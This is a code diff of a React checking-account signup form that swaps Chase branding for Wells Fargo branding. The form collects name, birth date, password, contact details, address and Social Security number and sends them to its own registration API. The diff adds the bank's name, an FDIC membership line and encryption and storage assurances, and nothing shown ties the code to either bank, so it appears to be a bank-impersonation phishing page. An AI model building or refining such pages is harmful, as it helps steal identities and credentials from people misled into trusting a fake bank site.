+      <h1 className="wf-step-title">Social Security number</h1>
+      <p className="wf-step-sub">Your SSN helps us verify your identity and is required by federal law.</p>
+      <div style={{ maxWidth: 340, marginBottom: 24 }}>
         <Field label="Social Security number" error={errors.ssn}>
-          <div className="relative flex items-center">
-            <input
-              type={show ? "text" : "password"}
-              value={data.ssn}
+          <div className="wf-ssn-wrap">
+            <input type={show?"text":"password"} value={data.ssn} placeholder="•••-••-••••" maxLength={11}
               onChange={(e) => onChange("ssn", formatSSN(e.target.value))}
-              placeholder="•••-••-••••"
-              maxLength={11}
-              className={`w-full border-b-2 bg-transparent outline-none py-2 pr-20 text-gray-900 text-base transition-colors focus:border-blue-700 placeholder-gray-300 ${errors.ssn ? "border-red-500" : "border-gray-300"}`}
-              style={{ fontFamily: "sans-serif" }}
-            />
-            <button
-              onClick={() => setShow(!show)}
-              className="absolute right-1 text-blue-700 text-sm font-semibold hover:opacity-75 transition-opacity flex items-center gap-1"
-              style={{ fontFamily: "sans-serif" }}>
-              {show ? <EyeOff size={14} /> : <Eye size={14} />}
+              className={`wf-input${errors.ssn?" error":""}`}
+              style={{ paddingRight: 64, width:"100%" }} />
+            <button className="wf-ssn-btn" onClick={() => setShow(!show)}>
+              {show ? <EyeOff size={13} /> : <Eye size={13} />}
               {show ? "Hide" : "Show"}
             </button>
           </div>
         </Field>
       </div>
-
-      <div className="border border-gray-200 rounded-lg p-4 bg-gray-50 flex items-start gap-3 max-w-lg">
-        <ShieldCheck size={18} className="text-gray-500 shrink-0 mt-0.5" />
-        <p className="text-sm text-gray-600 leading-relaxed" style={{ fontFamily: "sans-serif" }}>
-          We need to ask for your SSN to verify your information. We'll keep your data secure.
-        </p>
+      <div className="wf-info-box" style={{ maxWidth: 500 }}>
+        <ShieldCheck size={18} className="wf-icon" />
+        <p>Wells Fargo uses 128-bit SSL encryption and multi-layered security to protect your personal information. Your SSN is never stored in plain text.</p>
       </div>
     </>
   );
 }
 
-// ── Validation ─────────────────────────────────────────────────────────────
-
+/* ─── Validation ─────────────────────────────────────────────────────────── */
 function validate(step, data) {
   const e = {};
-  if (step === 1) {
-    if (!data.firstName.trim()) e.firstName = "Please tell us your first name.";
-    if (!data.lastName.trim()) e.lastName = "Please tell us your last name.";
+  if (step===1) {
+    if (!data.firstName.trim()) e.firstName="Please enter your first name.";
+    if (!data.lastName.trim()) e.lastName="Please enter your last name.";
   }
-  if (step === 2) {
-    const dobRe = /^\d{2}\/\d{2}\/\d{4}$/;
-    if (!dobRe.test(data.dob)) { e.dob = "Please enter a valid date (mm/dd/yyyy)."; }
+  if (step===2) {
+    const re=/^\d{2}\/\d{2}\/\d{4}$/;
+    if (!re.test(data.dob)) e.dob="Please enter a valid date (mm/dd/yyyy).";
     else {
-      const [m, d, y] = data.dob.split("/").map(Number);
-      const age = (new Date() - new Date(y, m - 1, d)) / (1000 * 60 * 60 * 24 * 365.25);
-      if (age < 18) e.dob = "You must be at least 18 years old to apply.";
+      const [m,d,y]=data.dob.split("/").map(Number);
+      const age=(new Date()-new Date(y,m-1,d))/(1000*60*60*24*365.25);
+      if (age<18) e.dob="You must be at least 18 years old to apply.";
     }
   }
-  if (step === 3) {
-    if (!data.email.trim() || !/\S+@\S+\.\S+/.test(data.email)) e.email = "Please enter a valid email address.";
-    if (!data.phone.trim() || data.phone.replace(/\D/g,"").length < 10) e.phone = "Please enter a valid 10-digit phone number.";
+  if (step===3) {
+    if (!data.email.trim()||!/\S+@\S+\.\S+/.test(data.email)) e.email="Please enter a valid email address.";
+    if (!data.phone.trim()||data.phone.replace(/\D/g,"").length<10) e.phone="Please enter a valid 10-digit phone number.";
   }
-  if (step === 4) {
-    if (!data.street.trim()) e.street = "Please enter your street address.";
-    if (!data.city.trim()) e.city = "Please enter your city.";
-    if (!data.state || data.state === "Select state") e.state = "Please select a state.";
-    if (!data.zip || data.zip.length < 5) e.zip = "Please enter a valid 5-digit ZIP code.";
+  if (step===4) {
+    if (!data.street.trim()) e.street="Please enter your street address.";
+    if (!data.city.trim()) e.city="Please enter your city.";
+    if (!data.state||data.state==="Select state") e.state="Please select a state.";
+    if (!data.zip||data.zip.length<5) e.zip="Please enter a valid 5-digit ZIP code.";
   }
-  if (step === 5) {
-    if (!data.usCitizen) e.usCitizen = "Please select an option.";
+  if (step===5) {
+    if (!data.usCitizen) e.usCitizen="Please select an option.";
   }
-  if (step === 6) {
-    const digits = (data.ssn || "").replace(/\D/g, "");
-    if (digits.length !== 9) e.ssn = "Please enter a valid 9-digit Social Security number.";
+  if (step===6) {
+    const digits=(data.ssn||"").replace(/\D/g,"");
+    if (digits.length!==9) e.ssn="Please enter a valid 9-digit Social Security number.";
   }
   return e;
 }
 
-// ── Root ───────────────────────────────────────────────────────────────────
-
-export default function ChaseMultiStepForm() {
+/* ─── Root ───────────────────────────────────────────────────────────────── */
+export default function WellsFargoSignupForm() {
   const [step, setStep] = useState(1);
   const [errors, setErrors] = useState({});
   const [done, setDone] = useState(false);
   const navigate = useNavigate();
 
   const [formData, setFormData] = useState({
-    firstName: "", middleName: "", lastName: "", suffix: "None",
-    dob: "",
-    password: "",
-    email: "", phone: "",
-    street: "", suite: "", city: "", state: "Select state", zip: "",
-    usCitizen: "",
-    ssn: "",
+    firstName:"", middleName:"", lastName:"", suffix:"None",
+    dob:"", password:"", email:"", phone:"",
+    street:"", suite:"", city:"", state:"Select state", zip:"",
+    usCitizen:"", ssn:"",
   });
 
   const handleChange = (field, value) => {
-    setFormData((prev) => ({ ...prev, [field]: value }));
-    if (errors[field]) setErrors((prev) => ({ ...prev, [field]: undefined }));
+    setFormData(p=>({...p,[field]:value}));
+    if (errors[field]) setErrors(p=>({...p,[field]:undefined}));
   };
 
-const handleNext = async () => {
-  const errs = validate(step, formData);
-
-  if (Object.keys(errs).length) {
-    setErrors(errs);
-    return;
-  }
-
-  setErrors({});
-
-  if (step < 6) {
-    setStep((s) => s + 1);
-  } else {
-    const res = await handleSubmit();
-
-    if (res.success) {
-      // ✅ redirect to dashboard
-  navigate("/dashboard");
-    } else {
-      // ❌ show backend error
-      setErrors({
-        api:
-          res.error?.email?.[0] ||
-          res.error?.username?.[0] ||
-          res.error?.error ||
-          "Registration failed"
-      });
+  const handleSubmit = async () => {
+    try {
+      const [m,d,y] = formData.dob.split("/");
+      const payload = {
+        username: formData.email, email: formData.email,
+        password: formData.password,
+        full_name: `${formData.firstName} ${formData.middleName} ${formData.lastName}`.trim(),
+        mobile: formData.phone.replace(/\D/g,""),
+        ssn: formData.ssn.replace(/\D/g,""),
+        date_of_birth: `${y}-${m}-${d}`,
+        address: `${formData.street}, ${formData.city}, ${formData.state} ${formData.zip}`
+      };
+      const result = await registerApi(payload);
+      localStorage.setItem("token", result.access);
+      return { success:true };
+    } catch(err) {
+      return { success:false, error:err };
     }
-  }
-};
-  const handleBack = () => { setErrors({}); setStep((s) => s - 1); };
+  };
 
-  const progress = STEPS.find((s) => s.id === step)?.progress ?? 18;
-
-const handleSubmit = async () => {
-  try {
-    const [m, d, y] = formData.dob.split("/");
-
-    const payload = {
-      username: formData.email,
-      email: formData.email,
-      password: formData.password,
-      full_name: `${formData.firstName} ${formData.middleName} ${formData.lastName}`.trim(),
-      mobile: formData.phone.replace(/\D/g, ""),
-      ssn: formData.ssn.replace(/\D/g, ""),
-      date_of_birth: `${y}-${m}-${d}`,
-      address: `${formData.street}, ${formData.city}, ${formData.state} ${formData.zip}`
-    };
-
-    const result = await registerApi(payload);
-
-    localStorage.setItem("token", result.access);
-
-    return { success: true };
-
-  } catch (err) {
-    return {
-      success: false,
-      error: err
-    };
-  }
-};
+  const handleNext = async () => {
+    const errs = validate(step, formData);
+    if (Object.keys(errs).length) { setErrors(errs); return; }
+    setErrors({});
+    if (step < 6) { setStep(s=>s+1); }
+    else {
+      const res = await handleSubmit();
+      if (res.success) { navigate("/dashboard"); }
+      else {
+        setErrors({ api: res.error?.email?.[0]||res.error?.username?.[0]||res.error?.error||"Registration failed" });
+      }
+    }
+  };
+  const handleBack = () => { setErrors({}); setStep(s=>s-1); };
+  const progress = STEPS.find(s=>s.id===step)?.progress??18;
 
   if (done) {
     return (
-      <div className="min-h-screen bg-gray-50 flex flex-col" style={{ fontFamily: "'Georgia', serif" }}>
+      <div className="wf-root">
+        <style>{styles}</style>
         <Navbar />
-        <div className="flex-1 flex items-center justify-center py-10">
-          <div className="bg-white rounded-2xl shadow-md p-12 text-center max-w-md">
-            <CheckCircle className="text-green-600 mx-auto mb-4" size={56} />
-            <h2 className="text-2xl font-bold text-gray-900 mb-2">Application Submitted!</h2>
-            <p className="text-gray-500 text-sm" style={{ fontFamily: "sans-serif" }}>
-              Thank you,{" "}
-              <span className="font-semibold text-gray-700">{formData.firstName}</span>.
-              We'll review your Chase Total Checking application and get back to you shortly.
+        <div className="wf-done-body">
+          <div className="wf-done-card">
+            <div className="wf-done-icon">
+              <CheckCircle size={32} color="#2E7D5A" />
+            </div>
+            <h2 className="wf-done-title">Application Submitted</h2>
+            <p className="wf-done-sub">
+              Thank you, <strong style={{ color:WF.text }}>{formData.firstName}</strong>. We've received your
+              Wells Fargo Everyday Checking application and will be in touch shortly.
             </p>
           </div>
         </div>
@@ -524,103 +723,85 @@ const handleSubmit = async () => {
   }
 
   return (
-    <div className="min-h-screen bg-gray-50 flex flex-col" style={{ fontFamily: "'Georgia', serif" }}>
+    <div className="wf-root">
+      <style>{styles}</style>
       <Navbar />
-
-      <div className="flex-1 flex items-start justify-center py-10 px-4">
-        <div className="w-full max-w-4xl bg-white rounded-2xl shadow-lg overflow-hidden flex flex-col md:flex-row">
+      <div className="wf-page">
+        <div className="wf-card">
 
           {/* Sidebar */}
-          <aside className="bg-white border-r border-gray-100 px-8 py-10 md:w-72 shrink-0">
-            <p className="text-xs text-gray-500 mb-1 tracking-widest uppercase font-medium"
-              style={{ fontFamily: "sans-serif" }}>
-              You're applying for:
-            </p>
-            <h2 className="text-xl font-bold text-gray-900 mb-6 leading-tight">
-              Chase Total Checking<sup className="text-xs align-super">®</sup>
+          <aside className="wf-sidebar">
+            <p className="wf-sidebar-product-label">You're applying for</p>
+            <h2 className="wf-sidebar-product-name">
+              Wells Fargo Everyday Checking<sup>®</sup>
             </h2>
-
-            <div className="flex items-center gap-2 mb-6">
-              <CheckCircle size={17} className="text-green-600 shrink-0" />
-              <span className="text-sm text-gray-700" style={{ fontFamily: "sans-serif" }}>
-                We're applying your offer.
-              </span>
+            <div className="wf-sidebar-offer">
+              <CheckCircle size={14} color="#F0C060" style={{ flexShrink:0 }} />
+              <span>Your offer has been applied.</span>
             </div>
-
-            <div className="border-t border-gray-200 pt-5 mb-8">
-              <div className="flex items-start gap-3">
-                <div className="mt-0.5 p-1.5 bg-gray-100 rounded-md shrink-0">
-                  <Lock size={14} className="text-gray-600" />
-                </div>
-                <p className="text-xs text-gray-500 leading-relaxed" style={{ fontFamily: "sans-serif" }}>
-                  <span className="font-semibold text-gray-700">Connection secured.</span>{" "}
-                  We work to ensure your personal information stays safe.
-                </p>
-              </div>
+            <div className="wf-sidebar-divider" />
+            <div className="wf-sidebar-secure">
+              <Lock size={14} color="rgba(255,255,255,0.5)" style={{ flexShrink:0, marginTop:1 }} />
+              <p><strong>Secured connection.</strong> Your personal information is protected with bank-level encryption.</p>
             </div>
-
-            {/* Step indicators */}
-            <div className="space-y-3">
-              {STEPS.map((s) => (
-                <div key={s.id} className="flex items-center gap-2.5">
-                  <div className={`w-6 h-6 rounded-full flex items-center justify-center text-xs font-bold shrink-0 transition-all duration-300 ${
-                    s.id < step
-                      ? "bg-green-600 text-white"
-                      : s.id === step
-                      ? "bg-blue-700 text-white"
-                      : "bg-gray-100 text-gray-400"
-                  }`} style={{ fontFamily: "sans-serif" }}>
-                    {s.id < step ? "✓" : s.id}
+            <div className="wf-step-list">
+              {STEPS.map(s => {
+                const state = s.id < step ? "done" : s.id === step ? "active" : "future";
+                return (
+                  <div key={s.id} className="wf-step-item">
+                    <div className={`wf-step-dot ${state}`}>
+                      {state==="done" ? "✓" : s.id}
+                    </div>
+                    <span className={`wf-step-label ${state}`}>{s.label}</span>
                   </div>
-                  <span className={`text-xs font-medium transition-colors ${
-                    s.id === step ? "text-blue-700" : s.id < step ? "text-green-700" : "text-gray-400"
-                  }`} style={{ fontFamily: "sans-serif" }}>
-                    {s.label}
-                  </span>
-                </div>
-              ))}
+                );
+              })}
             </div>
           </aside>
 
-          {/* Main content */}
-          <main className="flex-1 px-8 md:px-12 py-10">
-            {/* Progress */}
-            <div className="mb-8">
-              <p className="text-sm text-gray-500 mb-2 font-medium" style={{ fontFamily: "sans-serif" }}>
-                Your information
-              </p>
-              <div className="w-full h-1.5 bg-gray-200 rounded-full overflow-hidden">
-                <div className="h-full rounded-full transition-all duration-500 ease-out"
-                  style={{ width: `${progress}%`, background: "linear-gradient(90deg,#003087 0%,#0056d6 100%)" }} />
+          {/* Main */}
+          <main className="wf-main">
+            <div className="wf-progress-wrap">
+              <p className="wf-progress-label">Application progress</p>
+              <div className="wf-progress-track">
+                <div className="wf-progress-fill" style={{ width:`${progress}%` }} />
               </div>
             </div>
 
-            {/* Steps */}
-            <div className="min-h-72">
-              {step === 1 && <StepName data={formData} onChange={handleChange} errors={errors} />}
-              {step === 2 && <StepBirthday data={formData} onChange={handleChange} errors={errors} />}
-              {step === 3 && <StepContact data={formData} onChange={handleChange} errors={errors} />}
-              {step === 4 && <StepAddress data={formData} onChange={handleChange} errors={errors} />}
-              {step === 5 && <StepCitizenship data={formData} onChange={handleChange} errors={errors} />}
-              {step === 6 && <StepSSN data={formData} onChange={handleChange} errors={errors} />}
+            <div style={{ minHeight: 280 }}>
+              {step===1 && <StepName data={formData} onChange={handleChange} errors={errors} />}
+              {step===2 && <StepBirthday data={formData} onChange={handleChange} errors={errors} />}
+              {step===3 && <StepContact data={formData} onChange={handleChange} errors={errors} />}
+              {step===4 && <StepAddress data={formData} onChange={handleChange} errors={errors} />}
+              {step===5 && <StepCitizenship data={formData} onChange={handleChange} errors={errors} />}
+              {step===6 && <StepSSN data={formData} onChange={handleChange} errors={errors} />}
             </div>
 
-            {/* Nav buttons */}
-            <div className={`mt-10 flex ${step > 1 ? "justify-between" : "justify-end"}`}>
+            {errors.api && (
+              <div className="wf-api-error">
+                <AlertCircle size={15} />
+                {errors.api}
+              </div>
+            )}
+
+            <div className="wf-btn-row" style={{ justifyContent: step>1?"space-between":"flex-end" }}>
               {step > 1 && (
-                <button onClick={handleBack}
-                  className="px-10 py-3 rounded-md text-blue-700 font-semibold text-sm border-2 border-blue-700 hover:bg-blue-50 transition-colors"
-                  style={{ fontFamily: "sans-serif" }}>
-                  Back
-                </button>
+                <button className="wf-btn-back" onClick={handleBack}>Back</button>
               )}
-              <button onClick={handleNext}
-                className="px-12 py-3 rounded-md text-white font-semibold text-sm transition-all duration-200 hover:opacity-90 active:scale-95"
-                style={{ background: "linear-gradient(135deg,#003087 0%,#0056d6 100%)", fontFamily: "sans-serif", boxShadow: "0 4px 14px rgba(0,80,180,0.25)" }}>
-                Next
+              <button className="wf-btn-next" onClick={handleNext}>
+                {step===6 ? "Submit Application" : "Continue"}
               </button>
             </div>
+
+            <p style={{ fontSize:11, color:WF.textMuted, marginTop:20, lineHeight:1.6 }}>
+              Wells Fargo Bank, N.A. Member FDIC. Equal Housing Lender.
+              By continuing, you agree to our{" "}
+              <a href="#" style={{ color:WF.red, textDecoration:"none" }}>Terms & Conditions</a>{" "}
+              and{" "}
+              <a href="#" style={{ color:WF.red, textDecoration:"none" }}>Privacy Policy</a>.
+            </p>
           </main>
+
         </div>
       </div>
     </div>
